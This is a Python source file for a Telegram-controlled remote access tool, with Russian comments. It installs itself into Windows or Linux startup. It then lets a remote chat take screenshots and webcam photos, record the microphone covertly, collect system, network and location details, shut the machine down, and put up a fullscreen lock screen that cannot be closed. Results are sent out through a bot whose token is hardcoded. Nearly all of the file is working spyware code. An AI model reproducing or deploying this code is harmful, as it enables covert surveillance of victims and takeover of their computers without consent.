import os
import platform
import psutil
import pyautogui
import requests
import socket
import subprocess
import asyncio
import cv2  # Для работы с камерой
import tkinter as tk  # Для блокировки экрана
import pyaudio
import wave
from pydub import AudioSegment  # Для конвертации в OGG
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, Voice
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackContext
)

API_TOKEN = "8028513680:AAF2bv1lZ91Mo7HvTHhpRWu92niRuMOzsrM"
AUTHORIZED_CHATS = set()  # Список авторизованных чатов
PASSWORD = "slavaband0112"  # Пароль для авторизации

def add_to_startup():
    system = platform.system()
    script_path = os.path.abspath(__file__)
    try:
        if system == "Windows":
            startup_folder = os.path.join(
                os.environ["APPDATA"],
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            destination = os.path.join(startup_folder, "system_monitor.bat")
            with open(destination, "w") as f:
                f.write(f'python "{script_path}"')
        elif system == "Linux":
            service_content = f"""[Unit]
Description=System Monitor

[Service]
ExecStart={script_path}

[Install]
WantedBy=default.target
"""
            with open("/tmp/system_monitor.service", "w") as f:
                f.write(service_content)
            subprocess.run(["sudo", "mv", "/tmp/system_monitor.service", "/etc/systemd/system/"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "system_monitor.service"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "system_monitor.service"], check=True)
        print(f"Добавлено в автозагрузку ({system})")
    except Exception as e:
        print(f"Ошибка добавления в автозагрузку: {str(e)}")

def get_system_info():
    system_info = {
        "OS": f"{platform.system()} {platform.release()}",
        "Архитектура": platform.machine(),
        "Процессор": platform.processor(),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024.0 ** 3)),
        "Дисковое пространство (GB)": round(psutil.disk_usage("/").total / (1024.0 ** 3)),
        "Локальный IP": socket.gethostbyname(socket.gethostname()),
        "Публичный IP": requests.get("https://ifconfig.me/ip").text.strip(),
        "Город": requests.get("http://ip-api.com/json").json().get("city", "Не определен")
    }
    return system_info

def get_wifi_info():
    wifi_info = {}
    system = platform.system()
    if system == "Windows":
        try:
            result = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                text=True
            )
            lines = result.split('\n')
            for line in lines:
                if "SSID" in line:
                    wifi_info["Wi-Fi SSID"] = line.split(":")[1].strip()
                if "Physical address" in line:
                    wifi_info["MAC-адрес Wi-Fi"] = line.split(":")[1].strip()
        except Exception as e:
            wifi_info["Wi-Fi"] = f"Ошибка: {str(e)}"
    elif system == "Linux":
        try:
            interfaces = subprocess.check_output(["ip", "link", "show"], text=True).split('\n')
            wifi_interface = None
            for line in interfaces:
                if "wlan" in line:
                    wifi_interface = line.split(':')[1].strip()
                    break
            if wifi_interface:
                try:
                    mac = subprocess.check_output(
                        ["cat", f"/sys/class/net/{wifi_interface}/address"],
                        text=True
                    ).strip()
                    wifi_info["MAC-адрес Wi-Fi"] = mac
                except Exception as e:
                    wifi_info["MAC-адрес Wi-Fi"] = f"Ошибка: {str(e)}"
            else:
                wifi_info["MAC-адрес Wi-Fi"] = "Wi-Fi интерфейс не найден"
            try:
                ssid = subprocess.check_output(["iwgetid", "-r"], text=True).strip()
                wifi_info["Wi-Fi SSID"] = ssid
            except Exception as e:
                wifi_info["Wi-Fi SSID"] = f"Ошибка: {str(e)}"
        except Exception as e:
            wifi_info["Wi-Fi"] = f"Ошибка: {str(e)}"
    elif system == "Darwin":
        try:
            service = subprocess.check_output(
                ["networksetup", "-getcurrentnetworkservice"],
                text=True
            ).strip()
            ssid = subprocess.check_output(
                f"networksetup -getairportnetwork {service}",
                shell=True, text=True
            ).split(":")[1].strip()
            wifi_info["Wi-Fi SSID"] = ssid
            mac = subprocess.check_output(
                ["ifconfig", "en0"],
                text=True
            ).split("ether ")[1].split(" ")[0]
            wifi_info["MAC-адрес Wi-Fi"] = mac
        except Exception as e:
            wifi_info["Wi-Fi"] = f"Ошибка: {str(e)}"
    return wifi_info

def get_open_ports():
    ports = []
    system = platform.system()
    if system == "Windows":
        result = subprocess.run(["netstat", "-ano"], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        for line in lines:
            if "TCP" in line and "LISTENING" in line:
                parts = line.split()
                ports.append(f"{parts[1]} (PID: {parts[-1]})")
    else:
        result = subprocess.run(["netstat", "-tuln"], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        for line in lines:
            if "LISTEN" in line:
                parts = line.split()
                ports.append(parts[3])
    return ports

def get_current_volume():
    system = platform.system()
    volume = 0
    if system == "Windows":
        from ctypes import cast, POINTER, windll
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume)).GetMasterVolumeLevelScalar() * 100
    elif system == "Linux":
        try:
            result = subprocess.check_output(["amixer", "get", "Master"], text=True)
            volume_line = [line for line in result.split('\n') if "Front Left:" in line][0]
            volume = int(volume_line.split("[")[1].split("%")[0])
        except:
            volume = 0
    elif system == "Darwin":
        try:
            volume = int(subprocess.check_output(
                ["osascript", "-e", 'output volume of (get volume settings)'],
                text=True
            ))
        except:
            volume = 0
    return volume

def increase_volume():
    system = platform.system()
    current_volume = get_current_volume()
    if current_volume == 0:
        return False
    if system == "Windows":
        from ctypes import cast, POINTER, windll
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)
    elif system == "Linux":
        subprocess.run(["amixer", "-q", "sset", "Master", "100%"])
    elif system == "Darwin":
        subprocess.run(["osascript", "-e", 'set volume output volume 100'])
    return True

def shutdown():
    system = platform.system()
    if system == "Windows":
        subprocess.run(["shutdown", "/s", "/t", "0"])
    elif system == "Linux":
        subprocess.run(["sudo", "shutdown", "-h", "now"])
    elif system == "Darwin":
        subprocess.run(["sudo", "shutdown", "-h", "now"])

async def spin_cursor(update: Update, context):
    system = platform.system()
    if system == "Windows" or system == "Linux":
        import math
        import time
        center_x, center_y = pyautogui.size()
        center_x //= 2
        center_y //= 2
        radius = 100
        angle = 0
        for _ in range(200):
            x = center_x + int(radius * math.cos(angle))
            y = center_y + int(radius * math.sin(angle))
            pyautogui.moveTo(x, y, duration=0.01)
            angle += 0.2
            time.sleep(0.01)
        await update.message.reply_text("Курсор начинает вращение.")
    else:
        await update.message.reply_text("Данная функция недоступна для macOS.")

async def start(update: Update, context):
    await update.message.reply_text("Введите пароль для доступа:")
    add_to_startup()

async def check_password(update: Update, context):
    text = update.message.text
    if text == PASSWORD:
        AUTHORIZED_CHATS.add(update.effective_chat.id)
        keyboard = [
            ["Скриншот", "Инфо о ПК"],
            ["Wi-Fi", "Открытые порты"],
            ["Повысить громкость", "Выключить ПК"],
            ["Фото с камеры", "Прослушка микрофона", "Блокировка"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("Выберите действие:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("Неверный пароль. Попробуйте еще раз.")

async def take_screenshot(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("temp_screenshot.png")
        with open("temp_screenshot.png", "rb") as photo:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo,
                caption="Скриншот экрана"
            )
        os.remove("temp_screenshot.png")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def system_info(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    info = get_system_info()
    message = "\n".join([f"{key}: {value}" for key, value in info.items()])
    await update.message.reply_text(f"Информация о системе:\n{message}")

async def wifi_info(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    wifi = get_wifi_info()
    message = "\n".join([f"{key}: {value}" for key, value in wifi.items()])
    await update.message.reply_text(f"Информация о Wi-Fi:\n{message}")

async def ports_info(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    ports = get_open_ports()
    if ports:
        message = "\n".join([f"- {port}" for port in ports])
    else:
        message = "Нет открытых портов."
    await update.message.reply_text(f"Открытые порты:\n{message}")

async def volume_up(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    try:
        current_volume = get_current_volume()
        if current_volume == 0:
            await update.message.reply_text("Громкость отключена. Включите звук и повторите попытку.")
            return
        if increase_volume():
            await update.message.reply_text("Громкость повышена до 100%!")
        else:
            await update.message.reply_text("Не удалось повысить громкость.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def shutdown_pc(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    try:
        shutdown()
        await update.message.reply_text("ПК будет выключен через 10 секунд.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def list_cameras(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    cameras = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cameras.append(f"{i} - Камера {i}")
            cap.release()
    if not cameras:
        await update.message.reply_text("Камеры не обнаружены.")
        return
    message = "\n".join(cameras)
    await update.message.reply_text(
        f"Доступные камеры:\n{message}\n\nНапишите номер камеры для съемки."
    )

async def camera_photo(update: Update, context):
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    try:
        camera_number = int(update.message.text)
        cap = cv2.VideoCapture(camera_number)
        if not cap.isOpened():
            await update.message.reply_text("Ошибка: камера недоступна.")
            return
        ret, frame = cap.read()
        if not ret:
            await update.message.reply_text("Не удалось сделать фото.")
            cap.release()
            return
        cv2.imwrite("temp_camera.jpg", frame)
        with open("temp_camera.jpg", "rb") as photo:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo,
                caption=f"Фото с камеры {camera_number}"
            )
        os.remove("temp_camera.jpg")
        cap.release()
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

# ФУНКЦИИ ПРОСЛУШКИ МИКРОФОНА
async def list_microphones(update: Update, context):
    """Перечисление доступных микрофонов"""
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    p = pyaudio.PyAudio()
    devices = []
    for i in range(p.get_device_count()):
        dev = p.get_device_info_by_index(i)
        if dev['maxInputChannels'] > 0:
            devices.append(f"{i} - {dev['name']}")
    p.terminate()
    
    if not devices:
        await update.message.reply_text("Микрофоны не обнаружены.")
        return
    
    message = "\n".join(devices)
    await update.message.reply_text(
        f"Доступные микрофоны:\n{message}\n\nНапишите номер микрофона для прослушки."
    )

async def record_microphone(update: Update, context):
    """Запись аудио с выбранного микрофона"""
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    try:
        mic_number = int(update.message.text)
        p = pyaudio.PyAudio()
        stream = p.open(
            format=pyaudio.paInt16,
            channels=1,
            rate=44100,
            input=True,
            frames_per_buffer=1024,
            input_device_index=mic_number
        )
        frames = []
        await update.message.reply_text("Прослушка началась. Жду 30 секунд...")
        
        for _ in range(0, int(44100 * 30 / 1024)):  # 30 секунд
            data = stream.read(1024)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Сохранение аудио в WAV
        with wave.open("temp_audio.wav", "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
        
        # Конвертация WAV в OGG
        audio = AudioSegment.from_wav("temp_audio.wav")
        audio.export("temp_audio.ogg", format="ogg")
        
        # Отправка голосового сообщения
        with open("temp_audio.ogg", "rb") as voice_file:
            await context.bot.send_voice(
                chat_id=update.effective_chat.id,
                voice=voice_file,
                caption="Запись с микрофона (30 секунд)"
            )
        
        os.remove("temp_audio.wav")
        os.remove("temp_audio.ogg")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

# ФУНКЦИЯ БЛОКИРОВКИ ЭКРАНА
def lock_screen():
    """Блокировка экрана с паролем 1234"""
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    
    label = tk.Label(root, text="Введите пароль для разблокировки:", fg='white', bg='black', font=('Arial', 20))
    label.pack(pady=20)
    
    password_entry = tk.Entry(root, show="*", font=('Arial', 16), fg='white', bg='black')
    password_entry.pack()
    
    def check_password():
        password = password_entry.get()
        if password == "1234":
            root.destroy()
        else:
            password_entry.delete(0, tk.END)
            label.config(text="Неверный пароль. Повторите попытку:")
    
    submit_button = tk.Button(root, text="Отправить", command=check_password, font=('Arial', 14), bg='black', fg='white')
    submit_button.pack(pady=10)
    
    # Запрет на закрытие окна через крестик
    def on_close():
        root.after(1000, lock_screen)  # При попытке закрытия окно пересоздается
    root.protocol("WM_DELETE_WINDOW", on_close)
    
    root.mainloop()

async def handle_lock(update: Update, context):
    """Обработчик кнопки 'Блокировка'"""
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Доступ запрещен.")
        return
    await update.message.reply_text("Экран заблокирован. Введите пароль для разблокировки.")
    # Запуск блокировки в новом потоке
    import threading
    threading.Thread(target=lock_screen).start()

async def handle_message(update: Update, context: CallbackContext):
    text = update.message.text
    if text == PASSWORD:
        await check_password(update, context)
        return
    if update.effective_chat.id not in AUTHORIZED_CHATS:
        await update.message.reply_text("Сначала введите пароль.")
        return
    if "Скриншот" in text:
        await take_screenshot(update, context)
    elif "Инфо о ПК" in text:
        await system_info(update, context)
    elif "Wi-Fi" in text:
        await wifi_info(update, context)
    elif "Открытые порты" in text:
        await ports_info(update, context)
    elif "Повысить громкость" in text:
        await volume_up(update, context)
    elif "Выключить ПК" in text:
        await shutdown_pc(update, context)
    elif "Повернуть курсор" in text:
        await spin_cursor(update, context)
    elif "Фото с камеры" in text:
        await list_cameras(update, context)
    elif "Прослушка микрофона" in text:
        await list_microphones(update, context)
    elif "Блокировка" in text:
        await handle_lock(update, context)
    else:
        try:
            device_number = int(text)
            if 0 <= device_number < 10:
                await camera_photo(update, context)
            else:
                await record_microphone(update, context)
        except:
            await update.message.reply_text("Ошибка: введите корректный номер устройства.")

# ИСПРАВЛЕННЫЙ main() БЕЗ idle()
def main():
    try:
        app = Application.builder().token(API_TOKEN).build()
        app.add_error_handler(
            lambda update, context: context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Ошибка: {str(context.error)}"
            )
        )
        app.add_handler(CommandHandler("start", start))
        
        # Обработчики для текстовых команд
        app.add_handler(MessageHandler(
            filters.Regex("^(Скриншот|Инфо о ПК|Wi-Fi|Открытые порты|Повысить громкость|Выключить ПК|Повернуть курсор|Фото с камеры|Прослушка микрофона|Блокировка)$"),
            lambda update, context: asyncio.create_task(
                handle_message(update, context)
            )
        ))
        app.add_handler(MessageHandler(
            filters.TEXT,
            lambda update, context: asyncio.create_task(
                handle_message(update, context)
            )
        ))
        print("Запуск бота...")
        app.run_polling()
    except Exception as e:
        print(f"Критическая ошибка: {str(e)}")

if __name__ == "__main__":
    main()